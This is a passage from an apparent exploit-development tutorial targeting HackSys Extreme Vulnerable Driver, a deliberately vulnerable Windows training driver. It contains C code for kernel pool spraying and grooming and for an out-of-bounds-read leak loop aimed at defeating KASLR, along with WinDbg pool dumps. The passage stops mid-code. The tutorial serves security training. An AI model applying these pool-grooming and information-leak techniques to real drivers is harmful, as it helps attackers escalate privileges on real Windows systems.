<a id="__codelineno-12-25" name="__codelineno-12-25"></a> ffff8700c6f66ee0 size:   80 previous size:   80  (Allocated)  Even
<a id="__codelineno-12-26" name="__codelineno-12-26"></a> ffff8700c6f66f60 size:   80 previous size:   80  (Allocated)  Even
</code></pre></div></td></tr></table></div>
<p>As you can see our objects are clearly present and between our allocations of objects. Remember the primitive is that we can read data from adjacent pool chunks. In the above, the chunk next to ours is actually in a free state, i.e, we don't control this chunk. But the subsequent chunks we do. In order to read the data we desire, we need to make sure that the adjacent pool chunks are filled with data which we control. </p>
<p>Now that we are able to control the pool page to a reliable degree we can begin our next task. As stated previously our goal is to leak addresses which we can use for future payloads such as when we need to bypass KASLR if we're in a low integrity environment. With the memory disclosure we currently have we're not leaking anything that useful. Now that we can control the pool page though we can leak something more interesting.</p>
<p>If we zoom out for a bit and take a look at some of the available functions in <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> we'll notice that there are some functions which are designed to allocate objects in the NonPagedNx Pool. This is ideal because we can use these objects in our pool spray so that when we execute our read primitive we're actually reading an object created by the driver which should give us an address inside the driver itself which we can then use to calculate the base address of the driver.</p>
<details class="attention" open="open">
<summary>Attention</summary>
<p>It is worth noting here that this primitive isn't entirely realistic. There would be some differences with a real driver but for the most part it is accurate.</p>
</details>
<h3 id="leaking-a-function-pointer">Leaking a Function Pointer<a class="headerlink" href="#leaking-a-function-pointer" title="Permanent link">&para;</a></h3>
<p>The above explanation was a bit of a word salad so lets break it down. Our goal is to leak an address which we can use in further exploitation, ideally it would be nice to have a primitive to get the base address of <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>. <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> comes with some "helper" functions which are specifically created to help with exploitation of some of the other exploit primitives.</p>
<p>These "helper" functions allocate objects in the NonPagedNx Pool to be used for exploitation of other vulnerabilities in <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>. For example, there is a function to allocate a fake object in the NonPagedPoolNx for the UaF primitive this function is called <code>AllocateUaFObjectNonPagedPoolNx</code>. This function is very simple, it does an allocation similar to the one that we observed in our vulnerable function. So how can we use it?</p>
<p>At the moment we have control of the pool, we can allocate objects sequentially without an issue which gives us reliable control over the pool. However, in order to get an address we can actually use for further exploitation we'll need to adapt our payload. Since we have a function which is able to make an allocation in the NonPagedNx Pool we can use this function to leak an address from <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>. If we perform our standard pool spray but then issue an <abbr title="Input Output Control">IOCTL</abbr> to the <code>AllocateUaFObjectNonPagedPoolNx</code> function, that function will create an object in the NonPagedNx Pool. If we can make it such that the allocated object lands between our sprayed objects we'll then be able to use our leak primitive to leak addresses from the chunk created by <code>AllocateUaFObjectNonPagedPoolNx</code> which should allow us to calculate the base address of <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr>.</p>
<p>We'll modify our existing spray and add a <code>DeviceIoControl</code> to call the <code>AllocateUaFObjectNonPagedPoolNx</code> function during our spray. What should happen is that objects from that function should land after every single Event Object.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-13-10">10</a></span>
<span class="normal"><a href="#__codelineno-13-11">11</a></span>
<span class="normal"><a href="#__codelineno-13-12">12</a></span>
<span class="normal"><a href="#__codelineno-13-13">13</a></span>
<span class="normal"><a href="#__codelineno-13-14">14</a></span>
<span class="normal"><a href="#__codelineno-13-15">15</a></span>
<span class="normal"><a href="#__codelineno-13-16">16</a></span>
<span class="normal"><a href="#__codelineno-13-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="cp">#define IOCTL_UAF 0x00222053</span>
<a id="__codelineno-13-2" name="__codelineno-13-2"></a>
<a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="kt">void</span><span class="w"> </span><span class="nf">PoolSpray</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">  </span><span class="n">EventObjects</span><span class="p">[</span><span class="mi">10000</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-13-6" name="__codelineno-13-6"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-13-7" name="__codelineno-13-7"></a>
<a id="__codelineno-13-8" name="__codelineno-13-8"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">10000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-13-9" name="__codelineno-13-9"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-13-10" name="__codelineno-13-10"></a><span class="w">        </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">EventHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-11" name="__codelineno-13-11"></a>
<a id="__codelineno-13-12" name="__codelineno-13-12"></a><span class="w">        </span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_UAF</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-13-13" name="__codelineno-13-13"></a>
<a id="__codelineno-13-14" name="__codelineno-13-14"></a><span class="w">        </span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EventHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-13-15" name="__codelineno-13-15"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-13-16" name="__codelineno-13-16"></a>
<a id="__codelineno-13-17" name="__codelineno-13-17"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Let's now run our updated payload and inspect the state of the pool. We'll use the same breakpoint we used previously and then get the pool address from the <code>RAX</code> register.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-14-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-14-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-14-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-14-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-14-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-14-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-14-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-14-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-14-10">10</a></span>
<span class="normal"><a href="#__codelineno-14-11">11</a></span>
<span class="normal"><a href="#__codelineno-14-12">12</a></span>
<span class="normal"><a href="#__codelineno-14-13">13</a></span>
<span class="normal"><a href="#__codelineno-14-14">14</a></span>
<span class="normal"><a href="#__codelineno-14-15">15</a></span>
<span class="normal"><a href="#__codelineno-14-16">16</a></span>
<span class="normal"><a href="#__codelineno-14-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a>1: kd&gt; !pool ffff8700c77278c0
<a id="__codelineno-14-2" name="__codelineno-14-2"></a>Pool page ffff8700c77278c0 region is Nonpaged pool
<a id="__codelineno-14-3" name="__codelineno-14-3"></a> ffff8700c7727000 size:   70 previous size:    0  (Allocated)  Hack
<a id="__codelineno-14-4" name="__codelineno-14-4"></a> ffff8700c7727070 size:  840 previous size:   70  (Free)       Free
<a id="__codelineno-14-5" name="__codelineno-14-5"></a>*ffff8700c77278b0 size:  210 previous size:  840  (Allocated) *Hack
<a id="__codelineno-14-6" name="__codelineno-14-6"></a>        Owning component : Unknown (update pooltag.txt)
<a id="__codelineno-14-7" name="__codelineno-14-7"></a> ffff8700c7727ac0 size:   80 previous size:  210  (Free )  Io  
<a id="__codelineno-14-8" name="__codelineno-14-8"></a> ffff8700c7727b40 size:   80 previous size:   80  (Free )  Io  
<a id="__codelineno-14-9" name="__codelineno-14-9"></a> ffff8700c7727bc0 size:   80 previous size:   80  (Allocated)  Io   Process: ffff8700c6f2e580
<a id="__codelineno-14-10" name="__codelineno-14-10"></a> ffff8700c7727c40 size:   70 previous size:   80  (Allocated)  Hack
<a id="__codelineno-14-11" name="__codelineno-14-11"></a> ffff8700c7727cb0 size:   80 previous size:   70  (Allocated)  Even
<a id="__codelineno-14-12" name="__codelineno-14-12"></a> ffff8700c7727d30 size:   70 previous size:   80  (Allocated)  Hack
<a id="__codelineno-14-13" name="__codelineno-14-13"></a> ffff8700c7727da0 size:   80 previous size:   70  (Allocated)  Even
<a id="__codelineno-14-14" name="__codelineno-14-14"></a> ffff8700c7727e20 size:   70 previous size:   80  (Allocated)  Hack
<a id="__codelineno-14-15" name="__codelineno-14-15"></a> ffff8700c7727e90 size:   80 previous size:   70  (Allocated)  Even
<a id="__codelineno-14-16" name="__codelineno-14-16"></a> ffff8700c7727f10 size:   70 previous size:   80  (Allocated)  Hack
<a id="__codelineno-14-17" name="__codelineno-14-17"></a> ffff8700c7727f80 size:   80 previous size:   70  (Allocated)  Even
</code></pre></div></td></tr></table></div>
<p>As you can clearly see, after every event object we have a <code>Hack</code> object as well, this is perfect. We can now use our arbitrary size information leak to leak addresses from the adjacent chunks. What we'd like to do next is replace those created <code>Even</code> objects with the vulnerable object that features the out-of-bounds read. The desired end result of the pool looks like this.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a>VULN_OBJ | UAF_OBJ | VULN_OBJ | UAF_OBJ | [...]
</code></pre></div></td></tr></table></div>
<p>To achieve this goal we can make some minor modifications to our existing payload. We'll need to free our Event Objects so that our pool structure looks like below:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a>FREE | UAF_OBJ | FREE | UAF_OBJ | [...]
</code></pre></div></td></tr></table></div>
<p>We can simply issue a call to <code>CloseHandle()</code> on all of the event objects because almost immediately after we'll begin spraying the vulnerable objects and at least <strong>one</strong> of them should be adjacent to a <code>Hack</code> chunk thus giving us our read primitive.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Freeing the Event Objects</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
<span class="normal"><a href="#__codelineno-17-2">2</a></span>
<span class="normal"><a href="#__codelineno-17-3">3</a></span>
<span class="normal"><a href="#__codelineno-17-4">4</a></span>
<span class="normal"><a href="#__codelineno-17-5">5</a></span>
<span class="normal"><a href="#__codelineno-17-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="w">    </span><span class="cm">/* Free event objects */</span><span class="w"></span>
<a id="__codelineno-17-2" name="__codelineno-17-2"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">5000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-17-3" name="__codelineno-17-3"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-17-4" name="__codelineno-17-4"></a><span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span><span class="w"></span>
<a id="__codelineno-17-5" name="__codelineno-17-5"></a><span class="w">        </span><span class="n">EventObjects</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-17-6" name="__codelineno-17-6"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>With those objects being freed we can go ahead and spray 100 of our vulnerable objects, this is a simple case of creating a loop in our <code>exploit()</code> function. The reason why we're not going to replace all of the Event objects with vulnerable objects is because we need to ensure that we don't try and read too far out-of-bounds because that could cause a page fault which will generate a BSOD. Also, 100 vulnerable objects should be enough to get a reliable leak.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Spray 100 vulnerable objects</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-18-10">10</a></span>
<span class="normal"><a href="#__codelineno-18-11">11</a></span>
<span class="normal"><a href="#__codelineno-18-12">12</a></span>
<span class="normal"><a href="#__codelineno-18-13">13</a></span>
<span class="normal"><a href="#__codelineno-18-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-18-3" name="__codelineno-18-3"></a>
<a id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">           </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-18-5" name="__codelineno-18-5"></a><span class="w">    </span><span class="kt">char</span><span class="w">            </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="mh">0x270</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-18-6" name="__codelineno-18-6"></a><span class="w">    </span><span class="n">ULONGLONG</span><span class="w">       </span><span class="n">HevdBaseAddress</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-18-7" name="__codelineno-18-7"></a>
<a id="__codelineno-18-8" name="__codelineno-18-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Starting pool spray!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-18-9" name="__codelineno-18-9"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-18-10" name="__codelineno-18-10"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-18-11" name="__codelineno-18-11"></a><span class="w">        </span><span class="n">PoolSpray</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-18-12" name="__codelineno-18-12"></a><span class="w">        </span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">OutputBuffer</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-18-13" name="__codelineno-18-13"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-18-14" name="__codelineno-18-14"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>If we run the code above we're going to get a lot of junk data out that has no relation at all to our target object. We'll get lots of addresses which are not useful to us at all. </p>
<h2 id="improving-reliability">Improving Reliability<a class="headerlink" href="#improving-reliability" title="Permanent link">&para;</a></h2>
<p>As with any exploit the goal is reliability, this is especially important with information leaks because we want to be sure the address we are leaking is the address we think it is. Unfortunately, we're fighting the allocator here a little, but we can account for that in our POC. We can't guarantee with 100% certaintity that we will leak the call back address in the <abbr title="HackSys Extreme Vulnerable Driver">HEVD</abbr> UAF helper function every time, but we can implement some checks so that our leak runs <strong>until</strong> we're sure we've found it.</p>
<p>To do this we can implement some simple checks into our spray which can verify some of the received leaked data. Particularly we can do two things:</p>
<ol>
<li>Check for the presence of the <code>Hack</code> pool tag.</li>
<li>Verify the leaked address is a kernel address.</li>
</ol>
<p>The first check is more reliable than the latter check, so we'll perform that check first and once we confirm the pool tag is present in the received data, we'll check for kernel addresses. When we leak data we'll be leaking the pool chunks header which contains the pool tag. By checking the leaked data for the presence of the pool tag we know is used in the UaF helper object we can confirm that the leak on that iteration did in-fact leak a chunk belonging to the driver.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-19-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-19-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-19-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-19-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-19-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-19-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-19-10">10</a></span>
<span class="normal"><a href="#__codelineno-19-11">11</a></span>
<span class="normal"><a href="#__codelineno-19-12">12</a></span>
<span class="normal"><a href="#__codelineno-19-13">13</a></span>
<span class="normal"><a href="#__codelineno-19-14">14</a></span>
<span class="normal"><a href="#__codelineno-19-15">15</a></span>
<span class="normal"><a href="#__codelineno-19-16">16</a></span>
<span class="normal"><a href="#__codelineno-19-17">17</a></span>
<span class="normal"><a href="#__codelineno-19-18">18</a></span>
<span class="normal"><a href="#__codelineno-19-19">19</a></span>
<span class="normal"><a href="#__codelineno-19-20">20</a></span>
<span class="normal"><a href="#__codelineno-19-21">21</a></span>
<span class="normal"><a href="#__codelineno-19-22">22</a></span>
<span class="normal"><a href="#__codelineno-19-23">23</a></span>
<span class="normal"><a href="#__codelineno-19-24">24</a></span>
<span class="normal"><a href="#__codelineno-19-25">25</a></span>
<span class="normal"><a href="#__codelineno-19-26">26</a></span>
<span class="normal"><a href="#__codelineno-19-27">27</a></span>
<span class="normal"><a href="#__codelineno-19-28">28</a></span>
<span class="normal"><a href="#__codelineno-19-29">29</a></span>
<span class="normal"><a href="#__codelineno-19-30">30</a></span>
<span class="normal"><a href="#__codelineno-19-31">31</a></span>
<span class="normal"><a href="#__codelineno-19-32">32</a></span>
<span class="normal"><a href="#__codelineno-19-33">33</a></span>
<span class="normal"><a href="#__codelineno-19-34">34</a></span>
<span class="normal"><a href="#__codelineno-19-35">35</a></span>
<span class="normal"><a href="#__codelineno-19-36">36</a></span>
<span class="normal"><a href="#__codelineno-19-37">37</a></span>
<span class="normal"><a href="#__codelineno-19-38">38</a></span>
<span class="normal"><a href="#__codelineno-19-39">39</a></span>
<span class="normal"><a href="#__codelineno-19-40">40</a></span>
<span class="normal"><a href="#__codelineno-19-41">41</a></span>
<span class="normal"><a href="#__codelineno-19-42">42</a></span>
<span class="normal"><a href="#__codelineno-19-43">43</a></span>
<span class="normal"><a href="#__codelineno-19-44">44</a></span>
<span class="normal"><a href="#__codelineno-19-45">45</a></span>
<span class="normal"><a href="#__codelineno-19-46">46</a></span>
<span class="normal"><a href="#__codelineno-19-47">47</a></span>
<span class="normal"><a href="#__codelineno-19-48">48</a></span>
<span class="normal"><a href="#__codelineno-19-49">49</a></span>
<span class="normal"><a href="#__codelineno-19-50">50</a></span>
<span class="normal"><a href="#__codelineno-19-51">51</a></span>
<span class="normal"><a href="#__codelineno-19-52">52</a></span>
<span class="normal"><a href="#__codelineno-19-53">53</a></span>
<span class="normal"><a href="#__codelineno-19-54">54</a></span>
<span class="normal"><a href="#__codelineno-19-55">55</a></span>
<span class="normal"><a href="#__codelineno-19-56">56</a></span>
<span class="normal"><a href="#__codelineno-19-57">57</a></span>
<span class="normal"><a href="#__codelineno-19-58">58</a></span>
<span class="normal"><a href="#__codelineno-19-59">59</a></span>
<span class="normal"><a href="#__codelineno-19-60">60</a></span>
<span class="normal"><a href="#__codelineno-19-61">61</a></span>
<span class="normal"><a href="#__codelineno-19-62">62</a></span>
<span class="normal"><a href="#__codelineno-19-63">63</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-3" name="__codelineno-19-3"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">           </span><span class="n">BytesReturned</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="w">    </span><span class="kt">char</span><span class="w">            </span><span class="n">OutputBuffer</span><span class="p">[</span><span class="mh">0x270</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="w">    </span><span class="n">ULONGLONG</span><span class="w">       </span><span class="n">HevdBaseAddress</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-6" name="__codelineno-19-6"></a>
<a id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">search</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hack&quot;</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-8" name="__codelineno-19-8"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pos_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-9" name="__codelineno-19-9"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">pos_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-10" name="__codelineno-19-10"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len_search</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-11" name="__codelineno-19-11"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">len_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x270</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-12" name="__codelineno-19-12"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">Match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-13" name="__codelineno-19-13"></a>
<a id="__codelineno-19-14" name="__codelineno-19-14"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Starting pool spray!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-15" name="__codelineno-19-15"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-16" name="__codelineno-19-16"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-17" name="__codelineno-19-17"></a><span class="w">        </span><span class="n">PoolSpray</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-18" name="__codelineno-19-18"></a><span class="w">        </span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">OutputBuffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">OutputBuffer</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-19-19" name="__codelineno-19-19"></a>
<a id="__codelineno-19-20" name="__codelineno-19-20"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">pos_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">pos_text</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len_text</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">len_search</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">pos_text</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-19-21" name="__codelineno-19-21"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-22" name="__codelineno-19-22"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">OutputBuffer</span><span class="p">[</span><span class="n">pos_text</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">search</span><span class="p">[</span><span class="n">pos_search</span><span class="p">])</span><span class="w"></span>
<a id="__codelineno-19-23" name="__codelineno-19-23"></a><span class="w">            </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-19-24" name="__codelineno-19-24"></a><span class="w">                </span><span class="o">++</span><span class="n">pos_search</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-19-25" name="__codelineno-19-25"></a><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pos_search</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">len_search</span><span class="p">)</span><span class="w"></span>
